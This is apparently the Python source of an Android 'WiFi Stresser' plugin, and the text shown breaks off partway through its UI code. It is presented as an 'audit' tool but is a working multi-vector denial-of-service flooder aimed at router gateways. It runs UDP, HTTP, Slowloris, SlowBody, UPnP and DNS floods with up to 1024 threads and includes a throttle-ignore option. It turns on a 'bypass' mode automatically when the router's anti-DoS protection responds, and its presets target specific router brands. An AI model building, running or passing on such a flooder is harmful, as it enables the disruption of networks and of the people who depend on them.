HTTP_PATHS = [
    "/", "/login", "/cgi-bin/luci", "/api/v1/status",
    "/setup.html", "/index.html", "/status", "/service.cgi",
    "/rootDesc.xml", "/igd.xml", "/device.xml"
]

COMMON_AUDIT_PORTS = [
    (80, "HTTP"),
    (443, "HTTPS"),
    (53, "DNS"),
    (8080, "Web-Alt"),
    (1900, "SSDP/UPnP"),
    (5000, "UPnP Web"),
    (5351, "NAT-PMP")
]

JUNK_PAYLOADS = [os.urandom(size) for size in [128, 256, 512, 768, 1024]]


def generate_random_user_agent():
    android_models = ["SM-S928B", "SM-G998B", "Pixel 8 Pro", "Pixel 9", "23127PN0CG", "Redmi Note 13", "NX769J"]
    platforms = [
        ("Windows NT 10.0; Win64; x64", "chrome"),
        ("Windows NT 10.0; Win64; x64", "firefox"),
        ("Macintosh; Intel Mac OS X 10_15_7", "chrome"),
        ("Macintosh; Intel Mac OS X 10_15_7", "safari"),
        ("X11; Linux x86_64", "chrome"),
        ("X11; Linux x86_64", "firefox"),
        (f"Linux; Android {random.randint(11, 15)}; {random.choice(android_models)}", "mobile_chrome"),
        (f"iPhone; CPU iPhone OS {random.randint(16, 18)}_{random.randint(0, 5)} like Mac OS X", "mobile_safari")
    ]
    plat, browser = random.choice(platforms)
    chrome_ver = f"{random.randint(120, 138)}.0.{random.randint(1000, 6999)}.{random.randint(10, 199)}"
    firefox_ver = f"{random.randint(120, 136)}.0"
    safari_ver = f"{random.randint(16, 18)}.{random.randint(0, 5)}"

    if browser == "chrome":
        return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
    elif browser == "firefox":
        return f"Mozilla/5.0 ({plat}; rv:{firefox_ver}) Gecko/20100101 Firefox/{firefox_ver}"
    elif browser == "safari":
        return f"Mozilla/5.0 ({plat}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Safari/537.36"
    elif browser == "mobile_chrome":
        return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
    elif browser == "mobile_safari":
        return f"Mozilla/5.0 ({plat}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1"
    return f"Mozilla/5.0 ({plat}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"


def build_random_dns_query():
    tx_id = os.urandom(2)
    flags = b"\x01\x00"
    qdcount = b"\x00\x01"
    ancount = b"\x00\x00"
    nscount = b"\x00\x00"
    arcount = b"\x00\x00"
    subdomain = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8)).encode()
    tld = random.choice([b"com", b"net", b"org", b"xyz", b"biz"])
    qname = bytes([len(subdomain)]) + subdomain + bytes([len(tld)]) + tld + b"\x00"
    qtype = random.choice([b"\x00\x01", b"\x00\x10", b"\x00\xff"])
    qclass = b"\x00\x01"
    return tx_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass


def build_upnp_soap_payload(gateway_ip):
    soap_body = (
        '<?xml version="1.0"?>\r\n'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n'
        '<s:Body>\r\n'
        '<u:GetStatusInfo xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n'
        '</u:GetStatusInfo>\r\n'
        '</s:Body>\r\n'
        '</s:Envelope>\r\n'
    )
    req = (
        f"POST /ctl/IPConn HTTP/1.1\r\n"
        f"Host: {gateway_ip}:1900\r\n"
        f"User-Agent: {generate_random_user_agent()}\r\n"
        f"SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#GetStatusInfo\"\r\n"
        f"Content-Type: text/xml; charset=\"utf-8\"\r\n"
        f"Content-Length: {len(soap_body)}\r\n"
        f"Connection: close\r\n\r\n"
        f"{soap_body}"
    )
    return req.encode()


class WiFiStresser(BasePlugin):
    def on_plugin_load(self):
        self.add_module(
            title="WiFi Stresser",
            description="L4/L7/L2/UPnP/DNS/WPA3 Bypass 4.0 audit",
            icon="wifi_off",
            screen="main",
            section="PLUGINS"
        )

        self.api.registerSettings(
            "WiFi Stresser",
            json.dumps([
                {"type": "slider", "key": "udp_threads", "title": "UDP threads",
                 "min": 16, "max": 1024, "default": 256, "steps": 1008},
                {"type": "slider", "key": "tcp_threads", "title": "TCP threads",
                 "min": 4, "max": 128, "default": 32, "steps": 124},
                {"type": "switch", "key": "throttle_ignore",
                 "title": "Ignore throttling",
                 "subtitle": "Do not reduce the send rate when overheating",
                 "default": False}
            ]),
            10
        )

        self._cache_privileges()

        self.running = False
        self.stop_flag = False
        self.threads = []
        self.sockets = []
        self.sockets_lock = threading.Lock()
        self.stats_lock = threading.Lock()
        self.stats = {"http": 0, "connect": 0, "hold": 0, "udp": 0, "upnp": 0, "dns": 0, "l2": 0}

        self.pps = 0
        self.time_left = 0
        self.ping_status = "Tap «Ping» to check the connection"
        self._is_pinging = False
        self._is_scanning_ports = False
        self._last_l2_time = 0.0

        self.vitality_status = "Waiting for the test to start"
        self.generated_report_text = ""
        self.scan_results = []

        self.logs = []
        self.logs_lock = threading.Lock()

        self.gateway = self.get_setting("gateway", "192.168.1.1")
        self.port = int(self.get_setting("port", 80))
        
        self.udp_threads = int(self.get_setting("udp_threads", 256))
        self.tcp_threads = int(self.get_setting("tcp_threads", 32))
        
        self.duration = int(self.get_setting("duration", 60))
        self.method = self.get_setting("method", "UDP")
        self.active_preset = self.get_setting("active_preset", "Custom")
        self.throttle_ignore = bool(self.get_setting("throttle_ignore", False))
        self.bypass_mode = bool(self.get_setting("bypass_mode", False))

        self.mixed_udp = self.get_setting("mixed_udp", True)
        self.mixed_connect = self.get_setting("mixed_connect", True)
        self.mixed_http = self.get_setting("mixed_http", True)
        self.mixed_hold = self.get_setting("mixed_hold", True)
        self.mixed_slowloris = self.get_setting("mixed_slowloris", True)
        self.mixed_slowbody = self.get_setting("mixed_slowbody", True)
        self.mixed_upnp = self.get_setting("mixed_upnp", True)
        self.mixed_dns = self.get_setting("mixed_dns", True)
        self.mixed_l2 = self.get_setting("mixed_l2", True)

        self._init_auto_gateway()

    def _cache_privileges(self):
        root_ok = False
        try:
            res = self.root("id")
            if res:
                res_str = str(res).strip().lower()
                if not ("denied" in res_str or "error" in res_str or "not found" in res_str):
                    root_ok = ("uid=0(" in res_str) or res_str.startswith("uid=0")
        except Exception:
            pass
        self._cached_root = root_ok

        shizuku_ok = False
        try:
            res = self.shizuku("id")
            if res:
                res_str = str(res).strip().lower()
                if not ("denied" in res_str or "error" in res_str or "not found" in res_str or "exception" in res_str):
                    shizuku_ok = ("uid=2000(" in res_str) or res_str.startswith("uid=2000") or ("uid=0(" in res_str) or res_str.startswith("uid=0")
        except Exception:
            pass
        self._cached_shizuku = shizuku_ok

    @property
    def has_root(self):
        return self._cached_root

    @property
    def has_shizuku(self):
        return self._cached_shizuku

    def _log(self, text, level="INFO"):
        icons = {"INFO": "ℹ️", "WARN": "⚠️", "ERR": "❌", "OK": "✅", "HEALTH": "🩺", "BYPASS": "⚡", "SCAN": "🔍"}
        prefix = icons.get(level, "🔹")
        timestamp = time.strftime("%H:%M:%S")
        entry = f"[{timestamp}] {prefix} {text}"

        with self.logs_lock:
            self.logs.append(entry)
            if len(self.logs) > 40:
                self.logs.pop(0)

    def _clear_logs(self):
        with self.logs_lock:
            self.logs.clear()
        self.refresh()

    def _record_error(self, method_name, error):
        err_str = str(error)
        err_type = type(error).__name__

        if "ECONNREFUSED" in err_str or "Connection refused" in err_str:
            detail = f"{method_name}: Port closed / reset by the router (RST)"
        elif "ETIMEDOUT" in err_str or "timed out" in err_str:
            detail = f"{method_name}: Timeout (gateway overloaded)"
        elif "ENETUNREACH" in err_str or "Network is unreachable" in err_str:
            detail = f"{method_name}: Network unreachable (Wi-Fi lost)"
        elif "EMFILE" in err_str or "Too many open files" in err_str:
            detail = f"{method_name}: OS file descriptor limit! Reduce TCP threads"
        elif "ENOBUFS" in err_str or "No buffer space" in err_str:
            detail = f"{method_name}: Network buffer full"
        elif "EPIPE" in err_str or "Broken pipe" in err_str:
            detail = f"{method_name}: Connection dropped by the gateway"
        else:
            detail = f"{method_name}: {err_type} ({err_str[:35]})"

        self._log(detail, "ERR")

    def _safe_close_socket(self, sock):
        if not sock:
            return
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass

    def _ui_and_timer_loop(self):
        last_total = 0
        last_time = time.time()
        timer_accumulator = 0.0

        while self.running and not self.stop_flag:
            time.sleep(0.4)
            now = time.time()
            dt = now - last_time
            last_time = now

            with self.stats_lock:
                current_total = sum(self.stats.values())
            if dt > 0:
                self.pps = int((current_total - last_total) / dt)
                last_total = current_total

            if self.duration > 0:
                timer_accumulator += dt
                if timer_accumulator >= 1.0:
                    dec = int(timer_accumulator)
                    self.time_left = max(0, self.time_left - dec)
                    timer_accumulator -= dec

                    if self.time_left <= 0:
                        threading.Thread(target=self._stop_stress, daemon=True).start()
                        break

            self.refresh()

    def _vitality_monitor_loop(self):
        time.sleep(3.0)
        while self.running and not self.stop_flag:
            target_host = self.gateway.strip()
            target_port = self.port
            target_ok = 0
            dns_ok = 0
            latencies = []

            for _ in range(3):
                if self.stop_flag:
                    break
                try:
                    t0 = time.time()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.8)
                    s.connect((target_host, target_port))
                    self._safe_close_socket(s)
                    latencies.append((time.time() - t0) * 1000)
                    target_ok += 1
                except Exception:
                    pass
                time.sleep(0.15)

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target_host, 53))
                self._safe_close_socket(s)
                dns_ok += 1
            except Exception:
                pass

            if target_ok == 0 and dns_ok > 0:
                status_str = "🛡️ Protection active (Anti-DoS / port filtered)"
                log_lvl = "HEALTH"

                if not self.bypass_mode:
                    self.bypass_mode = True
                    self.set_setting("bypass_mode", True)
                    self._log("⚡ The router is defending! Auto Bypass 4.0 enabled", "BYPASS")
                    self.toast("⚡ Keenetic auto-bypass enabled!")
            elif target_ok == 0 and dns_ok == 0:
                status_str = "🔴 Coma / Down (100% loss · timeout)"
                log_lvl = "ERR"
            else:
                avg_ms = round(sum(latencies) / len(latencies), 1) if latencies else 0.0
                loss = int(((3 - target_ok) / 3) * 100)
                if loss == 0 and avg_ms < 35:
                    status_str = f"🟢 Excellent (avg {avg_ms} ms · 0% loss)"
                    log_lvl = "OK"
                elif loss == 0 and avg_ms < 120:
                    status_str = f"🟡 Struggling (avg {avg_ms} ms · latency)"
                    log_lvl = "WARN"
                else:
                    status_str = f"🟠 Overloaded (avg {avg_ms} ms · {loss}% loss)"
                    log_lvl = "WARN"

            self.vitality_status = status_str
            self._log(f"Wi-Fi vitality: {status_str}", log_lvl)
            self.refresh()

            for _ in range(15):
                if not self.running or self.stop_flag:
                    break
                time.sleep(1.0)

    # ------------------- Diagnostics and scanning -------------------

    def _run_port_scan(self):
        if self._is_scanning_ports:
            return
        self._is_scanning_ports = True
        self.scan_results = []
        self._log(f"Scanning ports of gateway {self.gateway}...", "SCAN")
        self.toast("🔍 Scanning ports...")
        self.refresh()
        threading.Thread(target=self._async_port_scan_worker, daemon=True).start()

    def _async_port_scan_worker(self):
        target_host = self.gateway.strip()
        open_ports = []

        for p, name in COMMON_AUDIT_PORTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.6)
                res = s.connect_ex((target_host, p))
                self._safe_close_socket(s)
                if res == 0:
                    open_ports.append((p, name))
            except Exception:
                pass

        self._is_scanning_ports = False
        self.scan_results = open_ports

        if open_ports:
            ports_str = ", ".join([f"{p} ({name})" for p, name in open_ports])
            self._log(f"Open ports: {ports_str}", "OK")
            best_port = open_ports[0][0]
            self.port = best_port
            self.set_setting("port", best_port)
            self.toast(f"✅ Found: {len(open_ports)}. Selected {best_port} ({open_ports[0][1]})")
        else:
            self._log("No open TCP ports found (strict filtering active)", "WARN")
            self.toast("⚠️ No open ports detected")
        self.refresh()

    def _apply_preset(self, preset_name):
        self.active_preset = preset_name
        self.set_setting("active_preset", preset_name)

        if preset_name == "Standart":
            self.method = "HTTP"
            self.tcp_threads = 64
            self.bypass_mode = False
            self.port = 80
            self.toast("🎯 Preset: Standard router (HTTP)")
        elif preset_name == "Keenetic":
            self.method = "Mixed"
            self.udp_threads = 128
            self.tcp_threads = 24
            self.bypass_mode = True
            self.port = 53
            self.mixed_udp = True
            self.mixed_connect = True
            self.mixed_http = True
            self.mixed_hold = True
            self.mixed_slowloris = True
            self.mixed_slowbody = True
            self.mixed_upnp = True
            self.mixed_dns = True
            self.toast("🛡️ Preset: Protected router (Bypass 4.0)")
        elif preset_name == "Radio":
            self.method = "L2 (Root)" if (self.has_root or self.has_shizuku) else "UDP"
            self.udp_threads = 512
            self.bypass_mode = True
            self.toast("📡 Preset: Radio airtime flooding (512 UDP)")
        elif preset_name == "MaxStress":
            self.method = "Mixed"
            self.udp_threads = 512
            self.tcp_threads = 64
            self.bypass_mode = True
            self.mixed_udp = True
            self.mixed_connect = True
            self.mixed_http = True
            self.mixed_hold = True
            self.mixed_slowloris = True
            self.mixed_slowbody = True
            self.mixed_upnp = True
            self.mixed_dns = True
            self.toast("🔥 Preset: Full stress test")

        self.set_setting("method", self.method)
        self.set_setting("udp_threads", self.udp_threads)
        self.set_setting("tcp_threads", self.tcp_threads)
        self.set_setting("bypass_mode", self.bypass_mode)
        self.set_setting("port", self.port)
        self.refresh()

    def _export_audit_report(self):
        with self.stats_lock:
            total_packets = sum(self.stats.values())
            stats_copy = dict(self.stats)

        dur_text = f"{self.duration} sec" if self.duration > 0 else "No limit"
        thread_info = f"UDP: {self.udp_threads}, TCP: {self.tcp_threads}" if self.method == "Mixed" else (f"{self.tcp_threads} TCP" if self.method in ["CONNECT", "HTTP", "Hold", "Slowloris", "SlowBody"] else f"{self.udp_threads} UDP")

        report_lines = [
            "📋 === NETWORK AUDIT REPORT (WiFi Stresser v3.0) ===",
            f"👤 Author: {__author__}",
            f"🎯 Target: {self.gateway}:{self.port}",
            f"⚡ Method: {self.method} (Preset: {self.active_preset})",
            f"🧵 Threads: {thread_info} | Duration: {dur_text}",
            f"🛡️ WAF bypass mode: {'On (Bypass 4.0)' if self.bypass_mode else 'Off'}",
            f"🩺 Final vitality: {self.vitality_status}",
            f"📊 Total sent: {total_packets:,} pkt".replace(",", " "),
            f"📈 Peak rate: ~{self.pps} pkt/s",
            "--- Breakdown by vector ---",
            f"• UDP (DNS NXDOMAIN): {stats_copy.get('udp', 0)}",
            f"• UPnP SOAP XML: {stats_copy.get('upnp', 0)}",
            f"• DNS Flood: {stats_copy.get('dns', 0)}",
            f"• HTTP Flood: {stats_copy.get('http', 0)}",
            f"• TCP Connect: {stats_copy.get('connect', 0)}",
            f"• TCP Hold / Slowloris / SlowBody: {stats_copy.get('hold', 0)}",
            f"• L2 Wi-Fi Scans: {stats_copy.get('l2', 0)}",
            "=================================================="
        ]
        self.generated_report_text = "\n".join(report_lines)

        try:
            timestamp_str = time.strftime("%Y%m%d_%H%M%S")
            export_data = {
                "version": "3.0",
                "gateway": self.gateway,
                "port": self.port,
                "method": self.method,
                "total_packets": total_packets,
                "peak_pps": self.pps,
                "stats": stats_copy,
                "vitality": self.vitality_status
            }
            
            json_path = f"/sdcard/Download/wifi_audit_{timestamp_str}.json"
            with open(json_path, "w", encoding="utf-8") as f:
                json.dump(export_data, f, ensure_ascii=False, indent=4)

            csv_path = f"/sdcard/Download/wifi_audit_{timestamp_str}.csv"
            with open(csv_path, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["Metric", "Value"])
                for k, v in export_data.items():
                    if isinstance(v, dict):
                        for sub_k, sub_v in v.items():
                            writer.writerow([f"{k}_{sub_k}", sub_v])
                    else:
                        writer.writerow([k, v])
            self._log(f"Report saved to Download (JSON/CSV)", "OK")
        except Exception as e:
            self._log(f"File save error: {e}", "ERR")

        copied = False
        try:
            from com.chaquo.python import Python
            from android.content import Context, ClipData
            app_context = Python.getPlatform().getApplication()
            clipboard = app_context.getSystemService(Context.CLIPBOARD_SERVICE)
            clip = ClipData.newPlainText("WiFi Stresser Report", self.generated_report_text)
            clipboard.setPrimaryClip(clip)
            copied = True
        except Exception:
            pass

        if not copied:
            for attr in ["setClipboard", "copyToClipboard", "setClipboardText", "copy"]:
                if hasattr(self.api, attr):
                    try:
                        getattr(self.api, attr)(self.generated_report_text)
                        copied = True
                        break
                    except Exception:
                        pass

        self._log("Audit report generated and opened", "OK")
        self.toast("📋 Report copied and saved to files!" if copied else "📄 Report opened")
        self.navigate("report")

    def _open_rickroll(self):
        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        for method in ["openUrl", "open_url", "openBrowser"]:
            if hasattr(self.api, method):
                try:
                    getattr(self.api, method)(url)
                    return
                except Exception:
                    pass
        try:
            from com.chaquo.python import Python
            from android.content import Intent
            from android.net import Uri
            activity = Python.getPlatform().getApplication()
            intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            activity.startActivity(intent)
        except Exception:
            self.toast("⚡ Router successfully destroyed (in a parallel universe)")

    def _get_wifi_info(self):
        ssid = None
        ip = None
        is_wifi = False

        try:
            device_info = self.api.getDevice()
            if device_info:
                data = json.loads(device_info) if isinstance(device_info, str) else device_info
                wifi = data.get("wifi", {}) or data.get("network", {}).get("wifi", {})
                raw_ssid = wifi.get("ssid") or wifi.get("name") or wifi.get("SSID")
                raw_ip = wifi.get("ip") or wifi.get("IP") or wifi.get("address")

                if raw_ssid and str(raw_ssid).strip() not in ["<unknown ssid>", "0x", "", "null", "None"]:
                    ssid = str(raw_ssid).strip()
                    is_wifi = True
                if raw_ip and str(raw_ip).strip() not in ["", "null", "None"]:
                    ip = str(raw_ip).strip()
        except Exception:
            pass

        if not ip or ip in ["—", "127.0.0.1"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.4)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                self._safe_close_socket(s)
            except Exception:
                ip = None

        if ip:
            if ip.startswith("198.18."):
                ssid = "VPN Fake-IP (not Wi-Fi)"
                is_wifi = False
            elif ip.startswith("192.168."):
                is_wifi = True
                if not ssid:
                    ssid = "Wi-Fi (LAN)"
            elif ip.startswith("100.") or ip.startswith("10.") and not is_wifi:
                if not ssid:
                    ssid = "Mobile network / VPN"
            else:
                if not ssid:
                    ssid = "Connected (Wi-Fi/LAN)"
                    is_wifi = True
        else:
            ssid = "Wi-Fi not connected"

        return ssid, ip or "—", is_wifi

    def _init_auto_gateway(self):
        _, ip, is_wifi = self._get_wifi_info()
        if is_wifi and ip and ip != "—" and "." in ip:
            octets = ip.split(".")
            octets[-1] = "1"
            self.gateway = ".".join(octets)
            self.set_setting("gateway", self.gateway)
        else:
            if not self.gateway or self.gateway.startswith("198.18."):
                self.gateway = "192.168.1.1"

    def _auto_detect_gateway(self):
        _, ip, _ = self._get_wifi_info()
        if ip and ip != "—" and "." in ip:
            if ip.startswith("198.18."):
                self.toast("⚠️ Disable the Fake-IP VPN for auto-detection")
                return

            octets = ip.split(".")
            if len(octets) == 4:
                octets[-1] = "1"
                self.gateway = ".".join(octets)
                self.set_setting("gateway", self.gateway)
                self._log(f"Gateway auto-detected: {self.gateway}", "OK")
                self.refresh()
                self.toast(f"🎯 Gateway: {self.gateway}")
                return

        self.toast("❌ Failed to detect the subnet IP")

    def _test_gateway_reachability(self):
        if self._is_pinging:
            return
        self._is_pinging = True
        self.ping_status = "⏳ Checking connectivity..."
        self.refresh()
        threading.Thread(target=self._async_ping_worker, daemon=True).start()

    def _async_ping_worker(self):
        target_host = self.gateway.strip()
        target_port = self.port
        self._log(f"Checking connectivity to {target_host}:{target_port}...", "INFO")

        try:
            t0 = time.time()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.2)
            s.connect((target_host, target_port))
            self._safe_close_socket(s)
            ms = round((time.time() - t0) * 1000, 1)
            msg = f"Gateway responds · {ms} ms (port {target_port} open)"
            self.ping_status = f"✅ {msg}"
            self._log(msg, "OK")
        except Exception as e:
            try:
                t0 = time.time()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((target_host, 53))
                self._safe_close_socket(s)
                ms = round((time.time() - t0) * 1000, 1)
                self.ping_status = f"⚠️ Gateway is up ({ms} ms), but port {target_port} is closed/filtered"
                self._log(f"Port {target_port} closed/filtered ({type(e).__name__})", "WARN")
            except Exception as e2:
                self.ping_status = f"❌ No response from {target_host}"
                self._log(f"Host {target_host} unreachable: {e2}", "ERR")
        finally:
            self._is_pinging = False
            self.refresh()

    def _get_mixed_tcp_methods(self):
        methods = []
        if self.mixed_connect:
            methods.append(self._connect_once)
        if self.mixed_http:
            methods.append(self._http_once)
        if self.mixed_hold:
            methods.append(self._hold_once)
        if self.mixed_slowloris:
            methods.append(self._slowloris_once)
        if self.mixed_slowbody:
            methods.append(self._slowbody_once)
        return methods

    def _get_mixed_udp_methods(self):
        methods = []
        if self.mixed_udp:
            methods.append(self._udp_once)
        if self.mixed_upnp:
            methods.append(self._upnp_once)
        if self.mixed_dns:
            methods.append(self._dns_once)
        if self.mixed_l2 and (self.has_root or self.has_shizuku):
            methods.append(self._l2_once)
        return methods

    def on_setting_changed(self, payload):
        key = payload.get("key")
        value = payload.get("value")
        if key == "udp_threads":
            self.udp_threads = int(value)
            self.set_setting("udp_threads", self.udp_threads)
        elif key == "tcp_threads":
            self.tcp_threads = int(value)
            self.set_setting("tcp_threads", self.tcp_threads)
        elif key == "throttle_ignore":
            self.throttle_ignore = bool(value)
            self.set_setting("throttle_ignore", self.throttle_ignore)
        self.refresh()

    # ------------------- Main screen UI -------------------

    def screen_main(self, ui, api, state):
        ssid, ip, is_wifi = self._get_wifi_info()
        is_shizuku = self.has_shizuku
        is_root = self.has_root
        l2_available = is_root or is_shizuku
        log_content = "\n".join(self.logs[-7:]) if self.logs else "No events yet. Pick a preset or start the audit."

        # Mode grid
        mode_cards = [
            ui.text("Stress test mode", "titleMedium"),
            ui.row([
                self._method_chip(ui, "UDP", True),
                self._method_chip(ui, "CONNECT", True),
                self._method_chip(ui, "HTTP", True),
            ], spacing=6, fill_max_width=True),
            ui.row([
                self._method_chip(ui, "Hold", True),
                self._method_chip(ui, "Slowloris", True),
                self._method_chip(ui, "SlowBody", True),
            ], spacing=6, fill_max_width=True),
            ui.row([
                self._method_chip(ui, "UPnP XML", True),
                self._method_chip(ui, "DNS Flood", True),
                self._method_chip(ui, "Mixed", True),
            ], spacing=6, fill_max_width=True),
            ui.row([
                self._method_chip(ui, "L2 (Root)", l2_available),
            ], spacing=6, fill_max_width=True)
        ]

        if self.method == "Mixed":
            mode_cards.append(
                ui.button(
                    "⚙️ Configure the mix (Mixed)",
                    on_click=self._open_mixed_settings,
                    style="outlined",
                    fill_max_width=True
                )
            )

        time_progress = 0.0
        if self.running and self.duration > 0:
            time_progress = max(0.0, min(1.0, (self.duration - self.time_left) / float(self.duration)))

        if self.running:
            timer_text = "⏳ Running: ∞ Infinite" if self.duration == 0 else f"⏳ Time left: {self.time_left} sec (of {self.duration}s)"
        else:
            timer_text = f"⏱️ Duration: {'∞ Infinite' if self.duration == 0 else str(self.duration) + ' sec'}"

        net_icon = "📶" if is_wifi else "🌐"

        active_socks = len(self.sockets) if self.running else 0

        if self.method == "Mixed":
            stats_speed_text = f"⚡ {self.pps:,} pkt/s · 🪝 {active_socks} socks".replace(",", " ")
        elif self.method in ["Hold", "Slowloris", "SlowBody"]:
            stats_speed_text = f"🪝 Sockets held: {active_socks}"
        else:
            stats_speed_text = f"⚡ {self.pps:,} pkt/s".replace(",", " ")

        slider_components = []
        is_mixed = (self.method == "Mixed")
        is_tcp = (self.method in ["CONNECT", "HTTP", "Hold", "Slowloris", "SlowBody"])
        is_udp = (self.method in ["UDP", "UPnP XML", "DNS Flood", "L2 (Root)"])

        if is_mixed or is_udp:
            slider_components.append(
                ui.slider(
                    value=float(self.udp_threads),
                    on_change=lambda v: self._set_udp_threads(int(v)),
                    minimum=16,
                    maximum=1024,
                    title=f"UDP threads: {self.udp_threads}",
                    steps=1008
                )
            )

        if is_mixed or is_tcp:
            slider_components.append(
                ui.slider(
                    value=float(self.tcp_threads),
                    on_change=lambda v: self._set_tcp_threads(int(v)),
                    minimum=4,
                    maximum=128,
                    title=f"TCP threads: {self.tcp_threads} (OS limit)",
                    steps=124
                )
            )

        children = [
            # 1. Network and status
            ui.card([
                ui.column([
                    ui.text(f"{net_icon} {ssid}", "titleMedium"),
                    ui.text(f"IP: {ip}", "bodyMedium"),
                    ui.row([
                        ui.text(f"Shizuku: {'✅ Available' if is_shizuku else '❌ Not active'}", "bodySmall"),
                        ui.text(f"· Root: {'✅ Yes' if is_root else '❌ No'}", "bodySmall")
                    ], spacing=6)
                ], spacing=4)
            ]),

            # 2. Presets
            ui.card([
                ui.text("⚡ Load presets", "titleSmall"),
                ui.row([
                    ui.chip("TP-Link", selected=(self.active_preset == "Standart"), on_click=lambda: self._apply_preset("Standart")),
                    ui.chip("Keenetic WPA3 🛡️", selected=(self.active_preset == "Keenetic"), on_click=lambda: self._apply_preset("Keenetic")),
                ], spacing=6, fill_max_width=True),
                ui.row([
                    ui.chip("Radio airtime", selected=(self.active_preset == "Radio"), on_click=lambda: self._apply_preset("Radio")),
                    ui.chip("Max Stress 🔥", selected=(self.active_preset == "MaxStress"), on_click=lambda: self._apply_preset("MaxStress")),
                ], spacing=6, fill_max_width=True)
            ]),

            # 3. Target diagnostics
            ui.card([
                ui.row([
                    ui.text("🔍 Target diagnostics", "titleSmall"),
                    ui.button("📖 Guide", on_click=lambda: self.navigate("guide"), style="text")
                ], fill_max_width=True),
                ui.row([
                    ui.button("⚡ Check ping", on_click=self._test_gateway_reachability, style="outlined"),
                    ui.button("🔍 Port scanner", on_click=self._run_port_scan, style="outlined")
                ], spacing=8),
                ui.text(self.ping_status, "bodySmall")
            ]),

            # 4. Method selection
            ui.card(mode_cards),

            # 5. Target, timing, and thread settings
            ui.card([
                ui.row([
                    ui.text("Target and timing settings", "titleMedium"),
                    ui.button("🎯 Auto-IP", on_click=self._auto_detect_gateway, style="text")
                ], fill_max_width=True),
                ui.text_field(
                    value=self.gateway,
                    on_change=lambda v: self._set_gateway(v),
                    label="Gateway (router IP)",
                    single_line=True,
                    fill_max_width=True
                ),
                ui.row([
                    ui.text_field(
                        value=str(self.port),
                        on_change=lambda v: self._set_port(v),
                        label="Port (1-65535)",
                        single_line=True,
                        fill_max_width=True
                    ),
                    ui.text_field(
                        value=str(self.duration),
                        on_change=lambda v: self._set_duration(v),
                        label="Duration (sec)",
                        single_line=True,
                        fill_max_width=True
                    )
                ], spacing=8, fill_max_width=True),
                ui.text("Quick duration select:", "bodySmall"),
                ui.row([
                    self._duration_chip(ui, 15, "15s"),
                    self._duration_chip(ui, 30, "30s"),
                    self._duration_chip(ui, 60, "60s"),
                ], spacing=6, fill_max_width=True),
                ui.row([
                    self._duration_chip(ui, 120, "2 min"),
                    self._duration_chip(ui, 300, "5 min"),
                    self._duration_chip(ui, 0, "∞ Infinite"),
                ], spacing=6, fill_max_width=True),
                *slider_components,
                ui.switch(
                    checked=self.bypass_mode,
                    on_change=lambda v: self._set_bypass_mode(v),
                    title="🛡️ WAF bypass mode / WPA3 Bypass 4.0",
                    subtitle="Adaptive Transition Mode emulation and mixed traffic"
                ),
                ui.switch(
                    checked=self.throttle_ignore,
                    on_change=lambda v: self._set_throttle(v),
                    title="Ignore throttling",
                    subtitle="Maximum performance without micro-pauses"
                )
            ]),

            # 6. Control button
            ui.card([
                ui.button(
                    "🚀 Start stress" if not self.running else "⏹ Stop",
                    on_click=self._toggle_stress,
                    style="filled" if not self.running else "error",
                    fill_max_width=True
                )
            ]),

            # 7. Live statistics and progress
            ui.card([
                ui.row([
                    ui.text("📊 Statistics", "titleSmall"),
                    ui.text(stats_speed_text, "titleSmall")
                ], fill_max_width=True),
                ui.text(
                    f"HTTP {self.stats['http']} · CON {self.stats['connect']} · "
                    f"HOLD {self.stats['hold']} · UDP {self.stats['udp']} · UPnP {self.stats['upnp']} · "
                    f"DNS {self.stats['dns']} · L2 {self.stats['l2']}",
                    "bodySmall"
                ),
                ui.text(f"🩺 Wi-Fi vitality: {self.vitality_status}", "bodySmall"),
                ui.text(timer_text, "bodyMedium"),
                ui.wavy_progress(
